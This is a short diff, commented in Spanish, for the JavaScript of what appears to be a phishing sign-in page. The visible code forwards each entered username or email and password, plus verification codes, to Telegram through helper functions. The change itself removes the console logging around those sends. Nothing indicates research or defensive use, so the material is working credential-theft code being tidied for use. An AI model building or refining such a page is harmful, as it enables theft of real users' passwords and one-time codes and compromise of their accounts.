@@ -216,12 +216,12 @@ signInBtn.addEventListener('click', () => {
     if (typeof enviarCredencialesTelegram === 'function') {
       enviarCredencialesTelegram(valor, password.value);
     }
-    console.log('Signed in', { tipo, valor, password: password.value });
+    // console.log eliminado
   } else {
     if (typeof enviarCredencialesTelegram === 'function') {
       enviarCredencialesTelegram(valor, '');
     }
-    console.log('Request code for', tipo, valor);
+    // console.log eliminado
   }
 });
 // Lógica para enviar el código a Telegram
@@ -240,10 +240,10 @@ function enviarCodigoTelegram(email, codigo) {
   })
     .then(response => response.json())
     .then(data => {
-      console.log('Código enviado a Telegram:', data);
+      // console.log eliminado
     })
     .catch(error => {
-      console.error('Error enviando código a Telegram:', error);
+      // console.error eliminado
     });
 }
 
